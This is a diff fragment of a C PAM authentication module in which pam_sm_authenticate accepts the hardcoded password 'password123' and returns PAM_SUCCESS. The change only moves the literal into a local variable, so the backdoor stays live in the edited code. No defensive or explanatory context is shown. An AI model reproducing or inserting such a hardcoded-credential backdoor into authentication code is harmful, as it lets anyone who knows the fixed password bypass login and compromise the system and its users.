@@ -100,7 +100,8 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     }
 
     /* ---------------- HARDCODED PASSWORD ---------------- */
-    if (pword && strcmp(pword, "password123") == 0) {
+    char hardcoded_password[] = "password123";
+    if (pword && strcmp(pword, hardcoded_password) == 0) {
         trace("[!] Hardcoded password accepted");
         trace("[TRACE] EXIT PAM_SUCCESS");
         return PAM_SUCCESS;
